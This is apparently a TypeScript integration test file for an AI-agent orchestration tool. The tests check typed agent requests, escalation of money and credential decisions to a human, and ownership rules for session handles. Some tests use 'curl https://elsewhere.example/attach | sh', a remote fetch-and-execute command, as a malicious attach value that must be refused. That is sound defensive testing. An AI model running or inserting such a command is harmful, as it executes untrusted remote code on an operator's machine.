  escalated = await engine.execute(worker, 'request', escalated.id, { type: 'blocker', epoch: escalated.epoch, reason: 'The provider account has no quota left' }, randomUUID());
  assert.equal(escalated.nextAction!.kind, 'escalate');
  assert.equal((await reload(escalated)).actionQueue!.actions[0].state, 'pending', 'the escalate row waits for a judgment nobody mechanised');
  await engine.execute(operator, 'unblock', escalated.id, { reason: 'Quota restored' }, randomUUID());
});

// ---- AC-7: typed agent requests ---------------------------------------------------------------

test('integration:typed-agent-requests — an agent that needs something records a typed request, names its decider and exits without holding its lease, and master status shows it with how long it has waited', async () => {
  // Every type names exactly one decider, from those the project allows.
  assert.deepEqual([...agentRequestTypes], ['blocker', 'note']);
  assert.deepEqual(agentRequestTypes.map(type => deciderFor('GY-9', { type }).kind), ['follow-up', 'rule']);
  for (const type of agentRequestTypes) {
    const decider = deciderFor('GY-9', { type });
    assert.ok(decider.who.length > 0, `${type} names who decides it`);
    assert.equal(['rule', 'follow-up', 'human'].includes(decider.kind), true);
  }
  // Only one of the three human-only decisions reaches a person, whatever the type.
  for (const humanDecision of humanDecisions) assert.equal(deciderFor('GY-9', { type: 'blocker', humanDecision }).kind, 'human');

  // A blocker names a tracked follow-up item, still sets the blocker the gates read and ends the attempt.
  let blocked = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  blocked = await engine.execute(worker, 'request', blocked.id, { type: 'blocker', epoch: blocked.epoch, reason: 'the deployment provider is refusing every token' }, randomUUID());
  const blocker = openAgentRequests(blocked, new Date())[0];
  assert.equal(blocker.decider.kind, 'follow-up');
  assert.match(blocker.decider.command!, /graphyard master create — a follow-up item naming GY-\d+/);
  assert.equal(blocked.blocker, 'the deployment provider is refusing every token');
  assert.equal(blocked.lease, null);
  // Master status shows the open request with its decider and how long it has waited, addressed
  // to an agent; and the control plane names the escalation that leaves the executor loop for it.
  const snapshot = { work: await store.list(), now: new Date(Date.now() + 90_000).toISOString() };
  const line = agentRequestAttention(snapshot).find(entry => entry.subject === blocked.key)!;
  assert.match(line.text, /recorded a blocker on GY-\d+ 1.5 min ago and released its lease/);
  assert.match(line.text, /decided by a tracked follow-up work item/);
  assert.deepEqual([line.role, line.human, line.humanOnly], ['master', false, null]);
  assert.equal(line.next, blocker.decider.command);
  assert.ok(agentRequestReport(snapshot).some(entry => entry.key === blocked.key && entry.waitedMs >= 90_000));
  assert.ok(actionReport(snapshot).next.some(entry => entry.key === blocked.key && entry.kind === 'escalate'));

  // A note is a record, not a hand-off: it keeps the lease and asks nobody for anything.
  let noted = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  noted = await engine.execute(worker, 'request', noted.id, { type: 'note', epoch: noted.epoch, reason: 'the third fixture is the slow one; it dominates the suite' }, randomUUID());
  assert.ok(noted.lease, 'a note does not end the attempt');
  assert.equal(openAgentRequests(noted, new Date())[0].decider.kind, 'rule');

  // A human-only decision is the operator's, and says which of the three it is.
  let money = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  money = await engine.execute(worker, 'request', money.id, { type: 'blocker', epoch: money.epoch, humanDecision: 'spending-money-or-accounts', reason: 'finishing this needs a paid account with the provider' }, randomUUID());
  const human = openAgentRequests(money, new Date())[0];
  assert.equal(human.decider.kind, 'human');
  assert.match(human.decider.who, /spending money or accounts/);
  const humanLine = agentRequestAttention({ work: await store.list(), now: new Date().toISOString() }).find(entry => entry.subject === money.key)!;
  assert.deepEqual([humanLine.role, humanLine.human, humanLine.humanOnly], ['human', true, 'spending money or opening third-party accounts']);

  // A request from an attempt that ended is asked afresh: the next claim closes it.
  await engine.execute(worker, 'release', noted.id, { epoch: noted.epoch }, randomUUID());
  const reclaimed = await engine.execute(otherWorker, 'claim', noted.id, {}, randomUUID());
  assert.deepEqual(openAgentRequests(reclaimed, new Date()), [], 'a stale ask never looks like a live one');
  assert.equal(reclaimed.agentRequests!.at(-1)!.state, 'resolved');
  await engine.execute(otherWorker, 'release', reclaimed.id, { epoch: reclaimed.epoch }, randomUUID());

  // A request is closed by the party its record names, and by nobody else. Without that rule a
  // session could record a request for the human operator and then resolve it itself, and master
  // status would stop showing the very thing it exists to surface.
  await assert.rejects(engine.execute(worker, 'request', blocked.id, { type: 'note', resolve: blocker.id, reason: 'I close my own request' }, randomUUID()),
    /agent-a recorded this blocker; it is decided by a tracked follow-up work item, never by the session that asked/);
  await assert.rejects(engine.execute(otherWorker, 'request', blocked.id, { type: 'note', resolve: blocker.id, reason: 'another worker closes it' }, randomUUID()),
    /decided by a tracked follow-up work item; a worker credential cannot close it/);
  await assert.rejects(engine.execute(executorA, 'request', money.id, { type: 'note', resolve: human.id, reason: 'the loop closes it' }, randomUUID()),
    /a coordinator credential cannot close it/);
  assert.equal(requestResolutionRefusal({ type: 'blocker', requestedBy: 'agent-a', decider: deciderFor('GY-9', { type: 'blocker', humanDecision: 'issuing-credentials' }) }, { id: 'operator', role: 'admin' }), null);
  assert.equal(requestResolutionRefusal({ type: 'blocker', requestedBy: 'agent-a', decider: deciderFor('GY-9', { type: 'blocker' }) }, { id: 'master', role: 'coordinator' }), null,
    'a blocker names a tracked follow-up item, which the loop opens');
  assert.equal(requestResolutionRefusal({ type: 'note', requestedBy: 'agent-a', decider: deciderFor('GY-9', { type: 'note' }) }, { id: 'agent-a', role: 'worker' }), null,
    'a note decides nothing, so its author closes its own record');
  // The party the record does name closes it, with the reason on the record.
  const answered = await engine.execute(operator, 'request', blocked.id, { type: 'note', resolve: blocker.id, reason: 'the follow-up item tracks the provider fault' }, randomUUID());
  assert.deepEqual(openAgentRequests(answered, new Date()), []);
  assert.equal(answered.agentRequests!.find(entry => entry.id === blocker.id)!.resolution, 'the follow-up item tracks the provider fault');

  // Recording a typed request is the same write as the command it replaces, so it needs the same
  // authority: the live lease of the attempt that is asking. Without this rule any worker or
  // producer credential with no assignment could set the blocker that holds the ready gate on any
  // item in the graph.
  assert.deepEqual([...leaseHeldRequestTypes], ['blocker']);
  const unrelated = await release(await created());
  for (const type of leaseHeldRequestTypes) {
    const body: Record<string, unknown> = { type, reason: 'no lease on this item' };
    for (const actor of [otherWorker, producer]) {
      await assert.rejects(engine.execute(actor, 'request', unrelated.id, body, randomUUID()),
        new RegExp(`A ${type} names the attempt epoch that is asking`), `${actor.role} cannot record a lease-less ${type}`);
    }
    // Naming an epoch it does not hold is refused by the lease check itself.
    await assert.rejects(engine.execute(otherWorker, 'request', unrelated.id, { ...body, epoch: 1 }, randomUUID()), /lease|epoch/i);
  }
  const untouched = await reload(unrelated);
  assert.equal(untouched.blocker, null, 'no blocker was set by a credential holding nothing');
  assert.deepEqual(untouched.agentRequests ?? [], [], 'nothing was recorded at all');
  // A note moves nothing a gate reads, so a producer session with no lease may still record one.
  const noted2 = await engine.execute(producer, 'request', unrelated.id, { type: 'note', reason: 'the acceptance fixture needs a wider timeout on this host' }, randomUUID());
  assert.equal(openAgentRequests(noted2, new Date())[0].requestedBy, producer.id);
  assert.equal(noted2.blocker, null);

  // A session that ends waiting on input instead of recording one of these is recorded as failed
  // with that reason, and the record names the request it should have made.
  // Only one assignment may be held by this worker, so the cycle's observation is unambiguous.
  for (const open of await store.list()) {
    if (open.stage === 'done' || open.lease?.owner !== worker.id) continue;
    await engine.execute(worker, 'release', open.id, { epoch: open.lease.epoch }, randomUUID());
  }
  let waiting = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  waiting = await reload(waiting);
  const config = masterConfigSchema.parse({ version: 1, url: 'https://graphyard.example', credentialFile: '/outside/master.token', cliPath: '/outside/graphyard.mjs', repository: 'owner/project', baseBranch: 'main', githubAppId: 1234, hostId: 'host-1', masterAgentName: 'm', workers: [{ name: 'claude-worker', principal: worker.id, agentName: 'work-claude', mode: 'launch', kind: 'claude', credentialFile: '/outside/worker.token', approvals: 'auto' }] });
  const state = emptyDaemonState(config);
  const sessions: unknown[] = [];
  const effects: DaemonEffects = {
    closeSession: () => {}, dispatch: async () => ({}),
    observeDeployment: async () => ({ source: 'unavailable', sha: null, at: new Date().toISOString(), reason: 'not configured', deployed: [], pending: [] }),
    recordDeployment: async () => ({}),
    agents: () => [{ name: 'work-claude', pane_id: 'pane-9', agent_status: 'blocked' } as any],
    credentials: async () => ({ 'claude-worker': { available: true, reason: null } }),
    recordSession: async (item, handle) => { sessions.push(handle); return engine.execute(executorA, 'session', item.id, handle, randomUUID()); },
    snapshot: async () => ({ work: await store.list(), now: new Date().toISOString() }),
    persist: async () => {},
  };
  const cycle = await runCycle(config, state, effects);
  const failure = cycle.actions.find(action => action.kind === 'session' && action.work === waiting.key);
  assert.ok(failure, `the cycle recorded a session failure for ${waiting.key}; it recorded ${JSON.stringify(cycle.actions.map(action => [action.kind, action.work, action.state]))}`);
  assert.equal(failure!.state, 'failed');
  assert.match(failure!.detail, /is waiting on input \(Herdr reports it blocked\)/);
  assert.match(failure!.detail, /records a typed request and exits — POST \/api\/work\/GY-\d+\/request with a type of blocker or note — which names its decider and frees the item/);
  await engine.execute(worker, 'release', waiting.id, { epoch: waiting.epoch }, randomUUID());
});

test('integration:typed-agent-requests — the bound on recorded requests retires resolved ones and never evicts an open ask', async () => {
  // An open blocker request, recorded under the live lease of the attempt that asked, and left for
  // the follow-up item that answers it. Losing the record loses the ask master status surfaces.
  let item = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  item = await engine.execute(worker, 'request', item.id, { type: 'blocker', epoch: item.epoch, reason: 'the deployment provider is refusing every token' }, randomUUID());
  const ask = openAgentRequests(item, new Date())[0];
  assert.equal(item.lease, null, 'and the attempt ended, so the ask is not held by a session');

  // A note needs no lease, so any credential that reaches the item may record one. Trimming the
  // oldest entries to bound the list would therefore be a way to remove somebody else's ask:
  // enough notes and the open request falls off the end. The bound retires resolved requests
  // first — oldest first — and never evicts an open one, exactly as `sessions.ts::bounded` does
  // for handles, so the list stays bounded without anybody being able to silence an ask.
  for (let index = 0; index < agentRequestLimit + 10; index++) {
    item = await engine.execute(producer, 'request', item.id, { type: 'note', reason: `fixture ${index} is the slow one` }, randomUUID());
  }
  assert.equal(item.agentRequests!.length, agentRequestLimit, 'the list stays bounded');
  assert.ok(item.agentRequests!.some(entry => entry.id === ask.id), 'the open blocker survived every one of them');
  assert.equal(openAgentRequests(item, new Date()).filter(entry => entry.type === 'blocker').length, 1);
  assert.equal(item.nextAction!.kind, 'escalate', 'so the control plane still names the escalation the blocker raises');
  assert.equal(inputs(item).trigger, 'ready');
  // The notes themselves are what the bound retired: resolved entries, oldest first.
  const resolvedNote = item.agentRequests!.find(entry => entry.type === 'note')!;
  const closed = await engine.execute(producer, 'request', item.id, { type: 'note', resolve: resolvedNote.id, reason: 'a note is closed by its author' }, randomUUID());
  assert.equal(closed.agentRequests!.find(entry => entry.id === resolvedNote.id)!.state, 'resolved');
  const bounded = await engine.execute(producer, 'request', closed.id, { type: 'note', reason: 'one more, which retires a resolved entry rather than the ask' }, randomUUID());
  assert.ok(bounded.agentRequests!.some(entry => entry.id === ask.id));
  assert.ok(!bounded.agentRequests!.some(entry => entry.id === resolvedNote.id), 'the resolved note is the one that made room');
});

// ---- AC-8: session handles --------------------------------------------------------------------

test('integration:session-handles-visible — every launched session records a durable handle on the item, and master status and the dashboard show what it is working on and how to attach to it', async () => {
  let item = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  const handle = { id: `${worker.id}:${item.epoch}`, kind: 'implementation' as const, epoch: item.epoch, runtime: 'claude', host: 'vishrog', workspace: 'wE', tab: 'tab-17', pane: 'pane-42', attach: 'herdr pane attach pane-42 --workspace wE', transcript: '/home/agent/.claude/transcripts/gy-87.jsonl', subject: `${item.key}: the inverted loop`, state: 'running' as const };
  item = await engine.execute(worker, 'session', item.id, handle, randomUUID());
  const recorded = item.sessions![0];
  assert.deepEqual([recorded.runtime, recorded.host, recorded.workspace, recorded.tab, recorded.pane, recorded.transcript], ['claude', 'vishrog', 'wE', 'tab-17', 'pane-42', '/home/agent/.claude/transcripts/gy-87.jsonl']);
  assert.equal(recorded.state, 'running');
  assert.equal(attachCommand(recorded), 'herdr pane attach pane-42 --workspace wE', 'a running session is attached to directly');

  // A reviewer or producer session holds no lease and records its handle under its own identity.
  const reviewerHandle = { id: 'review-request-1', kind: 'review' as const, runtime: 'cursor', host: 'host-2', pane: 'pane-7', attach: 'herdr pane attach pane-7', subject: `${item.key}: review head aaaaaaaaaaaa`, state: 'running' as const };
  item = await engine.execute(executorA, 'session', item.id, reviewerHandle, randomUUID());
  assert.equal(item.sessions!.length, 2);
  assert.equal(item.sessions![1].principal, executorA.id);
  await assert.rejects(engine.execute(worker, 'session', item.id, reviewerHandle, randomUUID()), /records its handle under its assignment epoch/);

  // The attach command on a handle is an instruction an operator runs, so an existing handle
  // belongs to the session it names, its launcher, or an admin. A producer credential — these
  // live on CI runners — can neither mark a running worker session finished nor replace what
  // somebody is about to run.
  await assert.rejects(engine.execute(producer, 'session', item.id, { ...handle, epoch: undefined, state: 'finished' as const, outcome: 'not mine to end' }, randomUUID()),
    new RegExp(`Session handle ${handle.id} belongs to ${worker.id}`));
  await assert.rejects(engine.execute(producer, 'session', item.id, { ...reviewerHandle, attach: 'curl https://elsewhere.example/attach | sh' }, randomUUID()),
    new RegExp(`Session handle review-request-1 belongs to ${executorA.id}`));
  const untouched = (await reload(item)).sessions!;
  assert.equal(untouched.find(entry => entry.id === handle.id)!.state, 'running', 'nothing was ended by a credential the handle does not name');
  assert.equal(untouched.find(entry => entry.id === reviewerHandle.id)!.attach, 'herdr pane attach pane-7');
  // A launcher names whose session it started, and that session — and only it — fills in what the
  // launcher could not know. Nobody below a coordinator may name another principal's session.
  const proofHandle = { id: 'proof-request-1', kind: 'proof' as const, principal: producer.id, runtime: 'claude', host: 'host-3', pane: 'pane-8', attach: 'herdr pane attach pane-8', subject: `${item.key}: integration proofs`, state: 'running' as const };
  item = await engine.execute(executorA, 'session', item.id, proofHandle, randomUUID());
  assert.equal(item.sessions!.find(entry => entry.id === proofHandle.id)!.principal, producer.id);
  await assert.rejects(engine.execute(producer, 'session', item.id, { ...proofHandle, id: 'proof-request-2', principal: executorA.id }, randomUUID()),
    /Only a coordinator or an admin records a handle on behalf of the session it launched/);
  item = await engine.execute(producer, 'session', item.id, { ...proofHandle, tab: 'tab-3', transcript: '/home/producer/.claude/proofs.jsonl' }, randomUUID());
  const proofSession = item.sessions!.find(entry => entry.id === proofHandle.id)!;
  assert.deepEqual([proofSession.tab, proofSession.transcript, proofSession.principal], ['tab-3', '/home/producer/.claude/proofs.jsonl', producer.id],
    'the session the launcher named added what only it knew, onto the same record');

  // Creating a handle is the launch authority, not something any credential that reaches the item
  // has. A producer token — these live on CI runners — cannot squat the predictable id of a
  // session about to be launched, which would otherwise fix the ownership on itself and leave the
  // real session unable to record its own tab and transcript.
  await assert.rejects(engine.execute(producer, 'session', item.id, { id: `${otherWorker.id}:${item.epoch + 1}`, kind: 'implementation' as const, runtime: 'claude', host: 'host-5', attach: 'curl https://elsewhere.example/attach | sh', subject: `${item.key}: squatted before the launcher records it`, state: 'running' as const }, randomUUID()),
    /has no live dispatch request whose session could record one/);
  assert.ok(!(await reload(item)).sessions!.some(entry => entry.id === `${otherWorker.id}:${item.epoch + 1}`));

  // And the bound on the list is not a way to evict somebody else's handle either: a launcher may
  // record more sessions than the list keeps, and the running one an operator is about to attach
  // to survives all of them — only finished handles are retired to make room.
  for (let index = 0; index < sessionHandleLimit + 5; index++)
    item = await engine.execute(executorA, 'session', item.id, { id: `sweep-${index}`, kind: 'coordination' as const, runtime: 'claude', host: 'host-4', subject: `${item.key}: sweep ${index}`, state: index < 3 ? 'finished' as const : 'running' as const }, randomUUID());
  const survivors = (await reload(item)).sessions!;
  const worked = survivors.find(entry => entry.id === handle.id)!;
  assert.equal(worked.state, 'running', 'the worker session is still there');
  assert.equal(attachCommand(worked), 'herdr pane attach pane-42 --workspace wE', 'with the command that attaches to it');
  assert.ok(!survivors.some(entry => entry.id === 'sweep-0'), 'a finished handle is what makes room');
  assert.ok(survivors.every(entry => entry.state === 'running'), 'and nothing running was retired');

  // Master status reports each running session with what it works on and the command that attaches.
  const snapshot = { work: await store.list(), now: new Date().toISOString() };
  const report = sessionReport(snapshot);
  const running = report.running.find(entry => entry.id === handle.id && entry.key === item.key)!;
  assert.equal(running.subject, `${item.key}: the inverted loop`);
  assert.equal(running.attach, 'herdr pane attach pane-42 --workspace wE');
  assert.equal(running.key, item.key);
  assert.ok(runningSessions(snapshot.work, new Date()).length >= 2);

  // A finished session keeps its handle and links its transcript, so its work stays readable.
  item = await engine.execute(worker, 'session', item.id, { ...handle, state: 'finished', outcome: 'submitted PR 41' }, randomUUID());
  const finished = sessionSummary(item, new Date()).find(entry => entry.id === handle.id)!;
  assert.equal(finished.state, 'finished');
  assert.ok(finished.endedAt);
  assert.equal(finished.outcome, 'submitted PR 41');
  assert.equal(finished.attach, 'vishrog:/home/agent/.claude/transcripts/gy-87.jsonl', 'a finished session links its transcript');
  assert.equal(attachCommand({ state: 'finished', attach: null, transcript: null, host: 'h' }), 'no attach command and no transcript were recorded for this session');
  assert.equal(attachCommand({ state: 'running', attach: null, transcript: null, host: 'h' }), 'no attach command and no transcript were recorded for this session');
  assert.ok(sessionReport({ work: await store.list(), now: new Date().toISOString() }).finished.some(entry => entry.id === handle.id && entry.key === item.key));

  // The dashboard drawer shows the same facts: the running session, its subject and its attach
  // command, and the typed action the control plane computed for the item.
  const current = await reload(item);
  const dashboard: any = {
    token: '', work: snapshot.work, status: { actor: { role: 'admin' }, repository: 'owner/project', baseBranch: 'main' }, error: '', connected: true, lastUpdated: null,
    view: 'overview', setView: () => {}, filter: null, setFilter: () => {}, selected: current.id, setSelected: () => {}, creating: false, setCreating: () => {},
    busy: false, setBusy: () => {}, observedAt: Date.now(), jobs: [], query: '', setQuery: () => {}, operatorAgents: [], events: [], operatorAgentsError: null,
    features: {}, editingRequirements: false, setEditingRequirements: () => {}, codexAvailable: false, queue: [], sessionEpoch: { current: 0 },
    api: async () => ({}), refresh: async () => {}, action: async () => {}, setError: () => {}, signOut: () => {},
  };
  const markup = renderToStaticMarkup(createElement(WorkDetails, { ...dashboard, item: current }));
  assert.ok(markup.includes('Sessions running now'), 'the drawer names the sessions running on this item');
  assert.ok(markup.includes('review head aaaaaaaa<') || markup.includes('review head aaaaaaaa '), 'the subject, its commit shown as 8 characters (GY-168)');
  assert.ok(!markup.includes('aaaaaaaaa'), 'never the longer hex run');
  assert.ok(markup.includes('herdr pane attach pane-7'), 'the drawer carries the command that attaches to a specific agent');
  assert.ok(markup.includes('/home/agent/.claude/transcripts/gy-87.jsonl'), 'a finished session links its transcript');
  assert.ok(markup.includes('Next action'), 'the drawer names the typed action the control plane computed');

  await engine.execute(worker, 'release', current.id, { epoch: current.epoch }, randomUUID());
});

test('integration:session-handles-visible — the reviewer launcher records a handle for every session it starts, and a session blocked at a prompt keeps the attach command somebody needs', async () => {
  // A launched reviewer session used to exist only in this host's own ledger, which
  // is the relaying the handle exists to end. The dispatcher records one for each launch, from
  // the coordinates the launcher itself returns.
  const item = await submitted();
  await engine.observe(item.id, item.revision, observation(item, { reviews: [] }));
  const reviewable = await reload(item);
  // No proof holds the review (GY-1235): the reviewer is asked at once, and no producer is.
  assert.ok(reviewable.autoDispatch?.review, 'the control plane asked for a review of this head');
  assert.deepEqual(reviewable.autoDispatch!.producers, [], 'and for no proof');

  // Handle creation stays the launch authority it is: an id no live dispatch request names is
  // refused, so a producer token cannot mint handles on an item it merely reaches.
  await assert.rejects(engine.execute(producer, 'session', item.id, { id: `${reviewable.autoDispatch!.review!.id}-mine`, kind: 'proof' as const, runtime: 'claude', host: 'vishrog', subject: `${item.key}: a handle nothing asked for`, state: 'running' as const }, randomUUID()),
    /recorded by its launcher or by the session of a live dispatch request/);

  // The dispatcher `master run` builds, not one assembled here: the handle recording under test
  // is the wiring the shipped constructor returns, reached through the coordinator mutation the
  // daemon passes it. Only the outside world each launcher reaches is stubbed.
  const mutations: { path: string; body: any }[] = [];
  const production = dispatchEffects('/outside', () => fleetConfig, {
    snapshot: async () => ({ work: [await reload(item.id)], now: new Date().toISOString() }),
    mutate: async (path: string, body: unknown) => {
      mutations.push({ path, body });
      const [, id, command] = path.split('/');
      return engine.execute(executorA, command as any, id, body, randomUUID());
    },
    run: () => { throw new Error('this test reaches no launcher of its own'); },
  });
  assert.ok(production.recordSession, 'the dispatcher master run builds records a handle for what it launches');
  const handles: { key: string; handle: any }[] = [];
  const effects: DispatchEffects = {
    ...production,
    // Scoped to this item: a dispatch tick sweeps the whole graph, and the subject here is the
    // handle one launch records, not which items the sweep finds.
    snapshot: async () => ({ work: [await reload(item.id)], now: new Date().toISOString() }),
    agents: () => [],
    credentials: async profiles => Object.fromEntries(profiles.map(profile => [profile.name, { available: true, reason: null }])),
    reconcileReviews: async () => ({ reviews: [] }),
    reconcileProducers: async () => ({ producers: [] }),
    // What the real launchers return: the pane of the session they just started. The runtime and
    // the workspace are what this loop launched it into, and it knows both.
    launchReview: async () => ({ pane: 'pane-12' }),
    launchProducer: async () => ({ pane: 'pane-13' }),
    recordSession: async (work, handle) => { handles.push({ key: work.key, handle }); return production.recordSession!(work, handle); },
    persist: async () => {},
  };
  const cursor = emptyDispatchCursor(fleetConfig);
  const tick = await runDispatchTick(fleetConfig, cursor, effects);
  assert.deepEqual(tick.launched.map(entry => entry.kind), ['review'], `the tick launched ${JSON.stringify(tick.waiting)}`);
  assert.ok(tick.launched.every(entry => entry.work === item.key));
  // The launch registers its session before the runtime starts and then writes the pane the
  // launcher returned (GY-172 AC-2): two writes to one handle.
  assert.equal(new Set(handles.map(entry => entry.handle.id)).size, 1, 'a handle was recorded for the launch');
  assert.deepEqual(handles.map(entry => [entry.handle.kind, entry.handle.pane ?? null]), [['review', null], ['review', 'pane-12']],
    'registered before its runtime started, then given the pane it runs in');
  assert.deepEqual(mutations.map(mutation => mutation.path.split('/').at(-1)), ['session', 'session'], 'each write went to the control plane through the shipped mutation');
  // And a dispatcher built with nothing but a snapshot records them too: the mutation is derived
  // from the configuration the loop already runs on, so no caller can leave the handles out.
  assert.ok(dispatchEffects('/outside', () => fleetConfig, { snapshot: effects.snapshot }).recordSession, 'the handle recording is not a caller\'s option');
  const recorded = (await reload(item)).sessions ?? [];
  const review = recorded.find(handle => handle.kind === 'review')!;
  assert.deepEqual([review.runtime, review.workspace, review.pane], ['claude', 'wF', 'pane-12']);
  assert.equal(attachCommand(review), 'herdr pane attach pane-12 --workspace wF');
  assert.match(review.subject, /^GY-\d+: review [0-9a-f]{12} \(PR #\d+\)$/);
  // The handle is keyed on the dispatch request, so a relaunch for the same request updates it
  // rather than leaving two handles for one session.
  assert.equal(review.id, reviewable.autoDispatch!.review!.id);
  assert.equal(launchedSessionHandle('review', reviewable.autoDispatch!.review!, 'subject', 'host-1', undefined, 'claude', 'wF').attach, undefined,
    'a launcher that reports no pane records no attach command it cannot honour');

  // A worker session Herdr reports blocked is waiting on input, not gone: the attempt is recorded
  // as failed with that reason, and the handle stays running — the one moment anybody needs the
  // attach command is this one.
  let waiting = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  waiting = await reload(waiting);
  const blockedConfig = masterConfigSchema.parse({ ...fleetConfig, workers: [{ name: 'claude-worker', principal: worker.id, agentName: 'work-claude', mode: 'launch', kind: 'claude', credentialFile: '/outside/worker.token', approvals: 'auto' }] });
  const daemonEffects: DaemonEffects = {
    closeSession: () => {}, dispatch: async () => ({}),
    observeDeployment: async () => ({ source: 'unavailable', sha: null, at: new Date().toISOString(), reason: 'not configured', deployed: [], pending: [] }),
    recordDeployment: async () => ({}),
    agents: () => [{ name: 'work-claude', pane_id: 'pane-9', agent_status: 'blocked' } as any],
    credentials: async () => ({ 'claude-worker': { available: true, reason: null } }),
    recordSession: async (work, handle) => engine.execute(executorA, 'session', work.id, handle, randomUUID()),
    snapshot: async () => ({ work: await store.list(), now: new Date().toISOString() }),
    persist: async () => {},
  };
  const cycle = await runCycle(blockedConfig, emptyDaemonState(blockedConfig), daemonEffects);
  const failure = cycle.actions.find(action => action.kind === 'session' && action.work === waiting.key);
  assert.equal(failure?.state, 'failed', 'the attempt is recorded as failed with the reason');
  const blocked = (await reload(waiting)).sessions!.find(handle => handle.id === `${worker.id}:${waiting.epoch}`)!;
  assert.equal(blocked.state, 'running', 'a session waiting at a prompt has not ended');
  assert.equal(attachCommand(blocked), 'herdr pane attach pane-9 --workspace wF', 'and the command that attaches to it still works');
  assert.match(blocked.outcome!, /waiting on input instead of recording a typed request/);
  await engine.execute(worker, 'release', waiting.id, { epoch: waiting.epoch }, randomUUID());
});

// ---- The pure model, exercised directly -------------------------------------------------------

test('integration:typed-next-action — the queue is pure over the snapshot: the same state reconciles to the same rows, and a changed state retires the row that no longer applies', () => {
  const at = '2026-09-20T12:00:00.000Z', clock = Date.parse(at);
  const item = {
    id: 'work-1', key: 'GY-1', title: 'Pure', description: '', type: 'feature', priority: 1, dependencies: [], 
    criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }], policy: { checks: ['test'], review: true }, stage: 'ready', revision: 1, policyRevision: 1,
    createdAt: at, updatedAt: at, stageEnteredAt: at, ready: true, epoch: 0, lease: null, workspaces: [], candidate: null, submission: null,
    reworkRequested: false, scenarioRequirements: [], evidence: [], observation: null, blocker: null, violations: [],
    gates: [{ name: 'ready', passed: true, reasons: [] }, { name: 'build', passed: false, reasons: ['Worker has not submitted implementation for this attempt'] }],
  } as unknown as Work;
  const first = structuredClone(item), second = structuredClone(item);
  const a = reconcileActions(first, [first], new Date(clock));
  const b = reconcileActions(second, [second], new Date(clock + 60_000));
  assert.deepEqual(a.map(entry => entry.action.id), b.map(entry => entry.action.id), 'the row id is a function of the situation, not of the clock');
  assert.deepEqual(a.map(entry => entry.event), ['requested']);
  assert.deepEqual(reconcileActions(first, [first], new Date(clock + 1000)), [], 'an unchanged situation is idempotent');
  assert.equal(nextAction(first, [first], new Date(clock))!.kind, 'dispatch');

  // An executor claims it; a second executor reading the same snapshot finds nothing left.
  const claimed = claimAction([first], { id: 'executor-a', host: 'host-1', principal: 'executor-a' }, new Date(clock + 2000))!;
  assert.equal(claimed.row.state, 'claimed');
  assert.equal(claimAction([first], { id: 'executor-b', host: 'host-2', principal: 'executor-b' }, new Date(clock + 2001)), null);
  assert.deepEqual(openActions([first], new Date(clock + 3000)).map(entry => entry.row.id), []);
  assert.equal(queueSnapshot([first], new Date(clock + 3000)).claimed, 1);

  // The claim expires: the row returns to the queue, and the idle report names it.
  const later = new Date(clock + 2000 + actionClaimMs + 1);
  assert.deepEqual(reconcileActions(first, [first], later).map(entry => entry.event), ['reclaimed']);
  assert.equal(first.actionQueue!.actions[0].state, 'pending');
  assert.equal(idleActionable([first], new Date(clock + 6 * 60_000)).length, 1);
  assert.equal(idleActionable([first], new Date(clock + 60_000)).length, 0);

  // The situation changes: the row that no longer applies is retired, naming what replaced it.
  first.blocker = 'the provider account has no quota left';
  first.gates = [{ name: 'ready', passed: false, reasons: [first.blocker] }];
  const moved = reconcileActions(first, [first], new Date(clock + 7 * 60_000));
  assert.deepEqual(moved.map(entry => entry.event), ['cancelled', 'requested']);
  assert.match(moved[0].action.resolution!, /now needs escalate instead/);
  assert.equal(first.actionQueue!.actions[0].kind, 'escalate');
  assert.equal(first.actionQueue!.history.length, 1);

  // Settling a row nobody claimed, or one claimed by somebody else, is refused.
  const pending = first.actionQueue!.actions[0];
  assert.throws(() => settleAction(first, pending.id, { executor: 'executor-a', principal: 'executor-a' }, 'done', 'no claim', new Date(clock)), /not claimed/);
  assert.throws(() => settleAction(first, 'f'.repeat(32), { executor: 'executor-a', principal: 'executor-a' }, 'done', 'no such row', new Date(clock)), /not open on this work item/);
});

test('integration:typed-next-action — the gate evaluator and the action computation agree on every stage of one item', () => {
  const at = '2026-09-20T12:00:00.000Z';
  const base_: Work = {
    id: 'work-2', key: 'GY-2', title: 'Agreement', description: '', type: 'feature', priority: 2, dependencies: [], 
    criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }], policy: { checks: ['test'], review: true }, stage: 'backlog', revision: 1, policyRevision: 1,
    createdAt: at, updatedAt: at, stageEnteredAt: at, ready: false, epoch: 0, lease: null, workspaces: [], candidate: null, submission: null,
    reworkRequested: false, scenarioRequirements: [], evidence: [], observation: null, blocker: null, violations: [], gates: [],
  } as unknown as Work;
  const evaluated = (overrides: Partial<Work>) => {
    const probe = { ...structuredClone(base_), ...overrides } as Work;
    Object.assign(probe, evaluate(probe, [probe], new Date(at)));
    return probe;
  };
  // Backlog raises no action: nobody runs "decide this is worth doing".
  const backlog = evaluated({});
  assert.equal(backlog.gates.find(gate => !gate.passed)!.reasons[0], 'Not released from backlog');
  assert.equal(nextAction(backlog, [backlog], new Date(at)), null);
  // Once released, the action always answers the first refusing gate, naming it and its refusal.
  for (const probe of [evaluated({ ready: true }), evaluated({ ready: true, blocker: 'waiting on the provider' })]) {
    const action = nextAction(probe, [probe], new Date(at));
    const failing = probe.gates.find(gate => !gate.passed)!;
    assert.equal(action!.gate, failing.name);
    assert.equal(action!.refusal, failing.reasons[0]);
    assert.equal(action!.kind, refusalAction(probe, failing.name, failing.reasons[0]));
  }
  // An unfinished dependency belongs to the other item: this one names no action at all.
  const dependency = evaluated({ ready: true, id: 'work-3', key: 'GY-3' });
  const dependent = { ...evaluated({ ready: true, dependencies: ['work-3'] }) };
  Object.assign(dependent, evaluate(dependent, [dependent, dependency], new Date(at)));
  assert.match(dependent.gates.find(gate => gate.name === 'ready')!.reasons[0], /Dependency GY-3 is unfinished/);
  assert.equal(nextAction(dependent, [dependent, dependency], new Date(at)), null);
